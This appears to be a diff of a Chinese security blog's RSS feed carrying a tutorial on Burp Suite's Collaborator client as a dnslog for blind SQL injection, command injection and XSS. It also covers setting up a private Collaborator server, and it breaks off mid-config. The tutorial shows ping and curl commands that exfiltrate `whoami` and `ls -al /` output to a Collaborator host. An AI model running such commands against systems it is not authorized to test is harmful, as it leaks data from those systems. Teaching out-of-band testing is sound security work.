@@ -1,39 +1,39 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Burpsuite on runshell</title><link>https://runshell.github.io/tags/burpsuite/</link><description>Recent content in Burpsuite on runshell</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 15 Jul 2018 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/tags/burpsuite/index.xml" rel="self" type="application/rss+xml"/><item><title>Burp suite中的dnslog</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</guid><description>&lt;img src="https://runshell.github.io/images/1536409490993.png" alt="Featured image of post Burp suite中的dnslog" />&lt;p>[注]本文提到的burp均为付费专业版，免费社区版不具有该功能。&lt;/p>
-&lt;h2 id="0x00-什么是dnslog">0x00 什么是dnslog
-&lt;/h2>&lt;p>dnslog，顾名思义，就是dns服务产生的日志。有什么用呢？我们可以用子域名来携带出信息。&lt;/p>
-&lt;p>这种套路主要用于渗透测试中的盲打。执行系统命令没有回显的时候，sql盲注的时候，xss想将cookie带出来的时候……将你想得到的信息放在自己的域名前面作为子域名，dns服务器解析该域名时产生的日志中将会包含整个域名。如果携带的信息太长，可能dns就携带不了了，好在通常dnslog平台同时也提供http日志，可以使用http请求携带更多信息。&lt;/p>
-&lt;h2 id="0x01-burp-suite中的dnslog功能">0x01 burp suite中的dnslog功能
-&lt;/h2>&lt;p>&lt;strong>Collaborator client&lt;/strong> ，相比Burp中的&lt;code>proxy&lt;/code>、&lt;code>instruder&lt;/code>、&lt;code>scanner&lt;/code>等功能，这个功能可能鲜为人知了吧！启动位置如下图，&lt;code>Butp&lt;/code>→&lt;code>Burp Collaborator client&lt;/code>。&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Burpsuite on runshell</title><link>https://runshell.github.io/tags/burpsuite/</link><description>Recent content in Burpsuite on runshell</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 15 Jul 2018 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/tags/burpsuite/index.xml" rel="self" type="application/rss+xml"/><item><title>Burp suite中的dnslog</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</guid><description>&lt;img src="https://runshell.github.io/images/1536409490993.png" alt="Featured image of post Burp suite中的dnslog" />&lt;p>[注]本文提到的 burp 均为付费专业版，免费社区版不具有该功能。&lt;/p>
+&lt;h2 id="0x00-什么是-dnslog">0x00 什么是 dnslog
+&lt;/h2>&lt;p>dnslog，顾名思义，就是 dns 服务产生的日志。有什么用呢？我们可以用子域名来携带出信息。&lt;/p>
+&lt;p>这种套路主要用于渗透测试中的盲打。执行系统命令没有回显的时候，sql 盲注的时候，xss 想将 cookie 带出来的时候……将你想得到的信息放在自己的域名前面作为子域名，dns 服务器解析该域名时产生的日志中将会包含整个域名。如果携带的信息太长，可能 dns 就携带不了了，好在通常 dnslog 平台同时也提供 http 日志，可以使用 http 请求携带更多信息。&lt;/p>
+&lt;h2 id="0x01-burp-suite-中的-dnslog-功能">0x01 burp suite 中的 dnslog 功能
+&lt;/h2>&lt;p>&lt;strong>Collaborator client&lt;/strong> ，相比 Burp 中的&lt;code>proxy&lt;/code>、&lt;code>instruder&lt;/code>、&lt;code>scanner&lt;/code>等功能，这个功能可能鲜为人知了吧！启动位置如下图，&lt;code>Butp&lt;/code>→&lt;code>Burp Collaborator client&lt;/code>。&lt;/p>
 &lt;p>&lt;img src="https://runshell.github.io/images/1536408720503.png"
 loading="lazy"
 alt="Collaborator"
 >&lt;/p>
-&lt;p>启动Collaborator client后显示如下页面，burp会分配给我们一个三级域名，点击&lt;code>Copy to clipbord&lt;/code>可以将域名复制到粘贴板，如&lt;code>p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net&lt;/code> 。&lt;/p>
+&lt;p>启动 Collaborator client 后显示如下页面，burp 会分配给我们一个三级域名，点击&lt;code>Copy to clipbord&lt;/code>可以将域名复制到粘贴板，如&lt;code>p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net&lt;/code> 。&lt;/p>
 &lt;p>&lt;img src="https://runshell.github.io/images/1536409490993.png"
 loading="lazy"
 alt="1536409490993"
 >&lt;/p>
-&lt;p>下面举个简单的例子，在Linux shell中执行如下命令：&lt;/p>
+&lt;p>下面举个简单的例子，在 Linux shell 中执行如下命令：&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ping &lt;span style="color:#e6db74">`&lt;/span>whoami&lt;span style="color:#e6db74">`&lt;/span>.p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>点击Collaborator client窗口中的Poll now获取dnslog，如下图，在log条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了&lt;code>whoami&lt;/code>的执行结果。&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>点击 Collaborator client 窗口中的 Poll now 获取 dnslog，如下图，在 log 条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了&lt;code>whoami&lt;/code>的执行结果。&lt;/p>
 &lt;p>&lt;img src="https://runshell.github.io/images/1536409951024.png"
 loading="lazy"
 alt="1536409951024"
 >&lt;/p>
-&lt;p>如果想执行ls查看根目录有哪些文件，用dns携带不了那么多信息，转而使用http请求，执行如下命令：&lt;/p>
+&lt;p>如果想执行 ls 查看根目录有哪些文件，用 dns 携带不了那么多信息，转而使用 http 请求，执行如下命令：&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style="color:#e6db74">&amp;#34;`ls -al /`&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再次点击Collaborator client窗口中的Poll now获取log，我们可以在log区看到一条http日志，我们查看请求原始信息可以看到请求体中携带出了&lt;code>ls -al /&lt;/code>的执行结果。&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再次点击 Collaborator client 窗口中的 Poll now 获取 log，我们可以在 log 区看到一条 http 日志，我们查看请求原始信息可以看到请求体中携带出了&lt;code>ls -al /&lt;/code>的执行结果。&lt;/p>
 &lt;p>&lt;img src="https://runshell.github.io/images/1536410609261.png"
 loading="lazy"
 alt="1536410609261"
 >&lt;/p>
-&lt;p>有没有觉得明文携带这些信息太不安全了？可是使用https安全传送，例如：&lt;/p>
+&lt;p>有没有觉得明文携带这些信息太不安全了？可是使用 https 安全传送，例如：&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style="color:#e6db74">&amp;#34;`ls -al /`&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的结果和使用http一样。burp的dnslog功能也是相当全的。&lt;/p>
-&lt;h2 id="0x02-私有的collaborator-server">0x02 私有的Collaborator server
-&lt;/h2>&lt;p>上面举例的是使用burp的公共Collaborator server，有时我们需要使用私有的Collaborator server。使用公共的Collaborator server，但是，信息存储在别人的服务器上是没有保密性可言的。还有一种情况，就是需要渗透的目标在内网且不与外网互通的情况下，就得使用私有的Collaborator server。&lt;/p>
-&lt;p>下面我们来看看如何搭建私有的Collaborator server。burp提供了搭建Collaborator server的功能，在服务器上执行&lt;code>sudo java -jar burp.jar --collaborator-server&lt;/code> 即带&lt;code>--collaborator-server&lt;/code>参数运行burp即可启动服务。&lt;/p>
-&lt;p>然后在客户端配置，以此打开&lt;code>Project options&lt;/code>→&lt;code>Misc&lt;/code>→&lt;code>Burp Collaborator server&lt;/code> ，选择&lt;code>Use a private Collaborator server&lt;/code> ，在&lt;code>Server location&lt;/code>中设置服务器域名，没有域名的情况下可以使用IP，如果按IP地址指定服务器，则无法使用依赖于DNS解析的Burp与Collaborator相关的功能。 另外，默认情况下，Burp通过HTTPS轮询Collaborator服务器，并强制实施SSL信任以防止中间人攻击。如果您的Burp实例由于网络或其他限制而无法通过HTTPS直接轮询，您可以选择轮询未加密的HTTP。由于没有配置ssl证书，所以此处勾选&lt;code>Poll over unencrypted HTTP&lt;/code>即使用未加密的http轮询。详情如下图：&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的结果和使用 http 一样。burp 的 dnslog 功能也是相当全的。&lt;/p>
+&lt;h2 id="0x02-私有的-collaborator-server">0x02 私有的 Collaborator server
+&lt;/h2>&lt;p>上面举例的是使用 burp 的公共 Collaborator server，有时我们需要使用私有的 Collaborator server。使用公共的 Collaborator server，但是，信息存储在别人的服务器上是没有保密性可言的。还有一种情况，就是需要渗透的目标在内网且不与外网互通的情况下，就得使用私有的 Collaborator server。
+下面我们来看看如何搭建私有的 Collaborator server。burp 提供了搭建 Collaborator server 的功能，在服务器上执行&lt;code>sudo java -jar burp.jar --collaborator-server&lt;/code> 即带&lt;code>--collaborator-server&lt;/code>参数运行 burp 即可启动服务。
+然后在客户端配置，以此打开&lt;code>Project options&lt;/code>→&lt;code>Misc&lt;/code>→&lt;code>Burp Collaborator server&lt;/code> ，选择&lt;code>Use a private Collaborator server&lt;/code> ，在&lt;code>Server location&lt;/code>中设置服务器域名，没有域名的情况下可以使用 IP，如果按 IP 地址指定服务器，则无法使用依赖于 DNS 解析的 Burp 与 Collaborator 相关的功能。 另外，默认情况下，Burp 通过 HTTPS 轮询 Collaborator 服务器，并强制实施 SSL 信任以防止中间人攻击。如果您的 Burp 实例由于网络或其他限制而无法通过 HTTPS 直接轮询，您可以选择轮询未加密的 HTTP。由于没有配置 ssl 证书，所以此处勾选&lt;code>Poll over unencrypted HTTP&lt;/code>即使用未加密的 http 轮询。详情如下图：&lt;/p>
 &lt;p>&lt;img src="https://runshell.github.io/images/1536415372083.png"
 loading="lazy"
 alt="1536415372083"
@@ -43,118 +43,121 @@ alt="1536415372083"
 loading="lazy"
 alt="1536415454865"
 >&lt;/p>
-&lt;p>幸运的是，已经可以使用http请求了，使用方法和使用公共Collaborator server时一样，参见本文[0x01]。若要充分利用Collaborator服务器的功能，通常还需要创建合适的&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format" target="_blank" rel="noopener"
->配置文件&lt;/a>。&lt;/p>
-&lt;p>以下配置相关类容来自burp官网，然后机翻的结果：&lt;/p>
+&lt;p>幸运的是，已经可以使用 http 请求了，使用方法和使用公共 Collaborator server 时一样，参见本文[0x01]。若要充分利用 Collaborator 服务器的功能，通常还需要创建合适的&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format" target="_blank" rel="noopener"
+>配置文件&lt;/a>。
+以下配置相关类容来自 burp 官网，然后机翻的结果：&lt;/p>
 &lt;blockquote>
 &lt;p>协作者配置文件格式
-Burp Collaborator服务器的所有选项均使用配置文件进行控制。默认情况下，Collaborator服务器 在当前工作目录中查找名为collaborator.config的文件 。可以使用&amp;ndash;collaborator-config 参数从命令行覆盖此位置 ，例如:&lt;/p>
+Burp Collaborator 服务器的所有选项均使用配置文件进行控制。默认情况下，Collaborator 服务器 在当前工作目录中查找名为 collaborator.config 的文件 。可以使用&amp;ndash;collaborator-config 参数从命令行覆盖此位置 ，例如:&lt;/p>
 &lt;p>&lt;code>sudo java -jar burp.jar --collaborator-server --collaborator-config = myconfig.config&lt;/code>&lt;/p>
-&lt;p>配置文件使用JSON格式，支持注释。如果需要IP地址，您可以配置单个地址或地址列表。例如，以下任一项都可用于配置网络接口的本地地址:&lt;/p>
-&lt;p>&lt;code>&amp;quot;localAddress&amp;quot;:&amp;quot;10.20.0.159&amp;quot; &lt;/code>
-&lt;code>&amp;quot;localAddress&amp;quot;:[&amp;quot;10.20.0.159&amp;quot;，&amp;quot;127.0.0.1&amp;quot;]&lt;/code>&lt;/p>
+&lt;p>配置文件使用 JSON 格式，支持注释。如果需要 IP 地址，您可以配置单个地址或地址列表。例如，以下任一项都可用于配置网络接口的本地地址:&lt;/p>
+&lt;p>&lt;code>&amp;quot;localAddress&amp;quot;:&amp;quot;10.20.0.159&amp;quot; &lt;/code> &amp;gt;&lt;code>&amp;quot;localAddress&amp;quot;:[&amp;quot;10.20.0.159&amp;quot;，&amp;quot;127.0.0.1&amp;quot;]&lt;/code>&lt;/p>
 &lt;p>完整的示例配置文件以及每个可用选项的说明如下所示:&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;serverDomain&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;burpcollaborator.example.com&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;workerThreads&amp;#34;&lt;/span>:&lt;span style="color:#ae81ff">10&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;eventCapture&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>:[&lt;span style="color:#e6db74">&amp;#34;10.20.0.159&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>],
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;10.20.0.159 &amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;http&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>:&lt;span style="color:#ae81ff">80&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;serverDomain&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;burpcollaborator.example.com&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;workerThreads&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">10&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;eventCapture&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;10.20.0.159&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>],
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;10.20.0.159 &amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;http&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">80&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;https&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>:&lt;span style="color:#ae81ff">443&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;https&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">443&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;smtp&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>:[ &lt;span style="color:#ae81ff">25&lt;/span>,&lt;span style="color:#ae81ff">587&lt;/span> ]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;smtp&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>: [&lt;span style="color:#ae81ff">25&lt;/span>, &lt;span style="color:#ae81ff">587&lt;/span>]
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;#34;smtps&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span> :&lt;span style="color:#ae81ff">465&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;smtps&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">465&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ssl&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;certificateFiles&amp;#34;&lt;/span>:[
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ssl&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;certificateFiles&amp;#34;&lt;/span>: [
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;keys / burpcollaborator.example.com.key.pkcs8&amp;#34;&lt;/span>,
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;keys / burpcollaborator.example.com.crt&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;keys / intermediate.crt&amp;#34;&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;keys / intermediate.crt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;polling&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;10.20.0.159&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;http &amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;port&amp;#34;&lt;/span>:&lt;span style="color:#ae81ff">9090&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;polling&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;10.20.0.159&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;http &amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;port&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">9090&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;https&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;port&amp;#34;&lt;/span>:&lt;span style="color:#ae81ff">9443&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;https&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;port&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">9443&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ssl&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;hostname&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;collaboratorpolling.example.com&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ssl&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;hostname&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;collaboratorpolling.example.com&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;metrics&amp;#34;&lt;/span>:{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;metrics&amp;#34;&lt;/span>: {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;jnaicmez8&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;addressWhitelist&amp;#34;&lt;/span>:[&lt;span style="color:#e6db74">&amp;#34;21.10.23.0/24&amp;#34;&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;addressWhitelist&amp;#34;&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;21.10.23.0/24&amp;#34;&lt;/span>]
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;dns&amp;#34;&lt;/span>:{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;interfaces&amp;#34;&lt;/span>:[{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;ns1&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;34.23.11.6&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;98.87.76.55&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;ns2&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;34.23 .11.6&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;98.87.11.00&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }],
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ports&amp;#34;&lt;/span>:&lt;span style="color:#ae81ff">53&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;dns&amp;#34;&lt;/span>: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;interfaces&amp;#34;&lt;/span>: [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ns1&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;34.23.11.6&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;publicAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;98.87.76.55&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;logLevel&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;INFO&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;ns2&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;localAddress&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;34.23 .11.6&amp;#34;&lt;/span>,
